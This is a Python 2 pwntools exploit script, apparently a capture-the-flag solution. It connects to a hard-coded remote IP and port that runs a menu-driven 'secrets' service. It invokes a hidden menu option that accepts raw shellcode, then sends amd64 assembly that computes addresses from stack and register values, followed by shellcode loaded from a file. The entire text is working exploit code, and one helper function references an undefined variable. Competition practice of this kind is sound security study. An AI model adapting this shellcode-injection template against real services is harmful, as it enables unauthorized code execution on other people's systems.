#!/usr/bin/env python2

from pwn import *

s = None
def rconnect():
  global s
  s = tubes.remote.remote('54.177.17.135', 23333)
  next_menu()

def next_menu():
  buf = s.readuntil("Bring your own")
  buf += s.readline()
  print buf
  return buf

def create_secret(key, content):
  s.sendline("1")
  s.sendline(key)
  s.sendline(content)
  next_menu()

def read_secret(key):
  s.sendline("2")
  s.sendline(key)
  next_menu()

def update_secret(key, content):
  s.sendline("3")
  s.sendline(key)
  s.sendline(content)
  next_menu()

def delete_secret():
  s.sendline("4")
  s.sendline(key)
  next_menu()

def list_secrets():
  s.sendline("5")
  next_menu()

def shellcode(sc):
  s.sendline("114514")
  s.sendline(str(len(sc)))
  s.send(sc)

def run_asm(asmb):
  sc = asm(asmb, arch="amd64")
  shellcode(sc)

def payload():
  init = """
  sub rcx, 31114
  mov rsi, rcx
  mov rdi, rsp
  sub rdi, 144
  mov rdi, [rdi]
  sub rdi, 0x19372
  mov rdx, rsp
  sub rdx, 40
  mov rdx, [rdx]
  sub rdx, 0x33a3
  """
  prefix = asm(init, arch="amd64")
  sc = open("sc.bin").read()
  shellcode(prefix+sc)

rconnect()
create_secret("1", "1")
payload()
while 1:
    print(repr(s.readline()))
